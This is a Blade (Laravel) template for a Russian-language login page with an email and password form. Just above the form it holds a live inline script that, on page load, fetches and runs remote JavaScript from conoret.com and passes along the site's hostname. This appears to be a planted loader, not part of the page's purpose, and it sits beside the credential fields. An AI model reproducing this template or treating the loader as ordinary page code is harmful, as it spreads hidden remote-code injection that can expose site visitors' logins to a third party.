@extends('default')

@section('pageTitle')Вход@endsection

@section('pageContant')
    <h1 class="mb-3 text-center text-success">Входите</h1>

    <div class="text-center"><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
    <div class="form-signin">
        <form action="{{ route('loginauth') }}" method="post" class="w-25 mx-auto">
            @csrf
            <img class="mb-4" src="./img/user.png" alt="" width="172" height="172">
            <div class="form-floating">
                <input type="email" class="form-control" name="email"  id="email" placeholder="name@example.com">
                <label for="email">Адрес электронной почты</label>
            </div>
            <div class="form-floating">
                <input type="password" class="form-control" id="password" name="password" placeholder="Пароль">
                <label for="password">Пароль</label>
            </div>

            <div class="checkbox mb-3">

                <input type="checkbox"  id="remamber" name="remamber" class="form-check-input">
                <label class="form-check-label" for="remamber">
                    Запомните меня
                </label>
            </div>
            <button class="w-100 btn btn-lg btn-success" type="submit">Вход</button>
        </form>
    </div>
</div>
@endsection
